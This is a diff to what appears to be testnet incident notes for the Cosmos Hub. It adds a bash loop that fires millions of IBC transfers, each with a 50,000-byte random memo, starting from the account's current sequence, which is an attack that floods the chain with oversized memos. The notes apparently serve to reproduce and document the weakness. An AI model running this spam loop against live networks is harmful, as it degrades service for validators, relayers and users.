@@ -81,6 +81,17 @@ gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86
 for i in {3045..5000}; do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i ; sleep .1 ; done
 ```
 
+Abuse ibc memos using the account sequence to start
+```bash
+set -e
+
+SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')
+
+for i in $( eval echo {"$SEQUENCE"..10000000} )
+ do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i 
+done
+```
+
 
 
  Hub testnet blcok range 3881725 to 3881733
